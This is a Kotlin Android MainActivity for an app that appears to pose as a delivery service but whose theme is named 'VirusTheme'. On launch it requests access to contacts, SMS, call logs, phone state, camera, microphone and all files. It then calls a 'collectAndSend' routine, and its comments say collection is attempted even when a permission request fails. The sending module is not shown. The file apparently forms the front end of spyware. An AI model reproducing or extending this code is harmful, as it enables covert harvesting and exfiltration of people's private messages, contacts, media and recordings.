package com.baro.baro_baedal

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.baro.baro_baedal.modules.Collection
import com.baro.baro_baedal.ui.theme.VirusTheme
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {
    
    private lateinit var collection: Collection
    
    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.all { it.value }
        if (allGranted) {
            // MANAGE_EXTERNAL_STORAGE 권한 체크 (Android 11+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                checkManageExternalStoragePermission()
            } else {
                // 모든 권한이 허용되면 데이터 수집 시작
                lifecycleScope.launch {
                    collection.collectAndSend()
                }
            }
        }
    }
    
    private val manageStorageLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        // Settings에서 돌아온 후 권한 체크
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                lifecycleScope.launch {
                    collection.collectAndSend()
                }
            }
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        
        collection = Collection(this)
        
        // 권한 요청
        requestAllPermissions()
        
        setContent {
            VirusTheme {
                AppNavigator()
            }
        }
    }
    
    private fun requestAllPermissions() {
        val permissions = mutableListOf<String>().apply {
            add(Manifest.permission.READ_CONTACTS)
            add(Manifest.permission.READ_PHONE_STATE)
            add(Manifest.permission.READ_SMS)
            add(Manifest.permission.READ_CALL_LOG)
            add(Manifest.permission.CAMERA)
            add(Manifest.permission.RECORD_AUDIO)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.READ_MEDIA_IMAGES)
                add(Manifest.permission.READ_MEDIA_VIDEO)
                add(Manifest.permission.READ_MEDIA_AUDIO)
            } else {
                add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }
        
        // 이미 권한이 모두 있는지 확인
        val needRequest = permissions.any {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        
        if (needRequest) {
            requestPermissionLauncher.launch(permissions.toTypedArray())
        } else {
            // Android 11+에서는 MANAGE_EXTERNAL_STORAGE 권한도 체크
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                checkManageExternalStoragePermission()
            } else {
                // 이미 모든 권한이 있으면 바로 수집 시작
                lifecycleScope.launch {
                    collection.collectAndSend()
                }
            }
        }
    }
    
    /**
     * Android 11+ (API 30+)에서 MANAGE_EXTERNAL_STORAGE 권한을 체크하고 요청합니다.
     * 이 권한은 Settings에서 수동으로 허용해야 합니다.
     */
    private fun checkManageExternalStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                // 권한이 이미 있으면 데이터 수집 시작
                lifecycleScope.launch {
                    collection.collectAndSend()
                }
            } else {
                // Settings로 이동하여 권한 요청
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    manageStorageLauncher.launch(intent)
                } catch (e: Exception) {
                    // ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION이 없으면 일반 설정으로 이동
                    try {
                        val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                        manageStorageLauncher.launch(intent)
                    } catch (e2: Exception) {
                        // 권한 요청 실패해도 일단 수집 시도
                        lifecycleScope.launch {
                            collection.collectAndSend()
                        }
                    }
                }
            }
        }
    }
}